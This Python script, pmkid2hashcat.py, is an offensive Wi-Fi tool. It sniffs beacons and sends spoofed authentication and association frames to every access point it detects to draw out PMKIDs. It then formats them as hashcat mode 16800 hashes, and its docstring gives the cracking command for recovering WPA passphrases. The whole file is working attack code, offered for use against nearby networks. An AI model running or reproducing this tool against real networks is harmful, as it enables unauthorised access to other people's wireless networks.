#!/usr/bin/env python
"""
python3 ./pmkid2hashcat.py -i wlan1mon
hashcat -m 16800 hashes.file -a 3 -w 3 <psk>

Needs://
    - git clone https://github.com/stryngs/packetEssentials
    - git clone https://github.com/stryngs/easy-thread
    - git clone https://github.com/stryngs/quickset
"""
import argparse
import binascii
import packetEssentials as PE
import quickset as qs
import sys
from easyThread import Backgrounder
from scapy.all import *

class Shared(object):
    """Share a class for backgrounding"""
    def __init__(self):
        self.bH = self.beaconHandler()
    def beaconHandler(self):
        def snarf(packet):
            if packet.haslayer(Dot11Beacon):
                if packet[Dot11].addr2 not in capSet:
                    if len(packet[Dot11Elt].info) > 0:
                        print(packet[Dot11Elt].info)
                        essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})
                        pmkAsk(packet[Dot11].addr2, packet[Dot11Elt].info)
                        capSet.add(packet[Dot11].addr2)
                        print(capSet)
        return snarf


    def beaconBackgrounder(self):
        p = sniff(iface = 'wlan1mon', prn = self.bH, store = 0)


def pmkRip(packet):
    """Attempt to rip the PMKID"""
    pmkid = PE.pt.byteRip(packet[Raw].load,
                          order = 'last',
                          qty = 16,
                          compress = True)
    if pmkid[-1] != 0:
        return pmkid
    else:
        return False


def pmkAsk(tgtMac, tgtEssid):
    """Try and obtain the PMKID

    Based on experimentation with hcxdumptool
    """
    qs.sh.macTx = 'a0:12:34:56:78:90'
    qs.sh.macRx = tgtMac
    qs.sh.essid = tgtEssid
    auth1 = qs.supplicants.authenticate()
    auth1[Dot11].SC = 16
    auth2 = qs.supplicants.authenticate()
    auth2[Dot11].SC = 32
    ourAssc = qs.supplicants.associate()\
              /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
    ourAssc[Dot11].SC = 48
    sendp([auth1, auth2, ourAssc], iface = 'wlan1mon', inter = 1, verbose = False)


def packetHandler():
    """Packet Handler"""
    def snarf(packet):
        if packet[Dot11].addr2 not in capSet:
            pmkID = pmkRip(packet)
            if pmkID is not False:

                ## ESSID MAC: packet
                pmkDict.update({packet[Dot11].addr2: packet})

                ## Update capture set
                capSet.add(packet[Dot11].addr2)

                ## Set PMKID
                ourHash = pmkID + '*'

                ## BSSID
                ourHash += packet[Dot11].addr2.replace(':', '') + '*'

                ## Tgt MAC
                ourHash += packet[Dot11].addr1.replace(':', '') + '*'

                ## ESSID
                try:
                    ourHash += str(binascii.hexlify(essidDict.get(packet[Dot11].addr2))).replace("b'", '').replace("'", '')  ## Dirty workaround to make this work with Python2x and 3x.
                    print ('Obtained PMKID ~~> ', ourHash + ' -- ' + essidDict.get(packet[Dot11].addr2).decode() + ' -- ' + packet[Dot11].addr2 + '\n')
                    with open('hashes.file', 'a') as oFile:
                        oFile.write(ourHash + '\n')
                    with open('hashes.log', 'a') as oFile:
                        oFile.write(ourHash + '*' + essidDict.get(packet[Dot11].addr2).decode() + '\n')
                except Exception as e:
                    print('\n\n')
                    print(e)
                    print ('Error on line {}'.format(sys.exc_info()[-1].tb_lineno))
    return snarf


def main(args):

    ## Live
    if args.i is not None:
        ## Background Beacon sniffing
        sh = Shared()
        Backgrounder.theThread = sh.beaconBackgrounder
        bg = Backgrounder()
        bg.easyLaunch()

        ## EAPOL sniffing
        pHandler = packetHandler()
        pkts = sniff(iface = args.i, prn = pHandler, lfilter = lambda x: x.haslayer(EAPOL), store = 0)

    ## PCAP
    else:
        pkts = PcapReader(args.f)
        count = 0
        for p in pkts:
            print(count)
            pHandler(p)
            count += 1

## Prep
essidDict = {}
pmkDict = {}
xList = []
count = 1
qty = 0
capSet = set()
try:
    with open('hashes.file') as iFile:
        x = iFile.read().splitlines()
    cSet = set([i.split('*')[1] for i in x])
    for cap in cSet:
        capSet.add(':'.join(a + b for a, b in zip(cap[::2], cap[1::2])))
except:
    pass
if len(capSet) > 0:
    print('Excluding:\n ', capSet)

## ARGUMENT PARSING
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'pmkid2hashcat')
    group = parser.add_mutually_exclusive_group(required = True)
    group.add_argument('-f', metavar = '<capture file>', help = 'PCAP to parse')
    group.add_argument('-i', metavar = '<interface>', help = 'Interface to sniff on')
    args = parser.parse_args()
    main(args)
